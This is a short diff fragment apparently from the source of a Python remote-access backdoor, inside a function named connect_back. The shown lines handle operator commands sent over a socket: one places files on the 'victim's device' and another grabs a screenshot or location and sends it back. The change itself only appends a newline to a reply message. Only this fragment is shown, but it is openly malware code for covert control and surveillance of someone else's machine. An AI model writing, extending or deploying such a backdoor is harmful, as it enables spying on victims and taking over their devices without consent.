@@ -136,7 +136,7 @@ def connect_back():
             if cmd.lower().startswith("put-files-desktop"):
                 args_files = cmd.split()
                 put_files_in_desktop(args_files)
-                s.send(b"The files put on victim's device")
+                s.send(b"The files put on victim's device\n")
                 continue
             if cmd == "get-screenshot":
                 get_location_and_send()
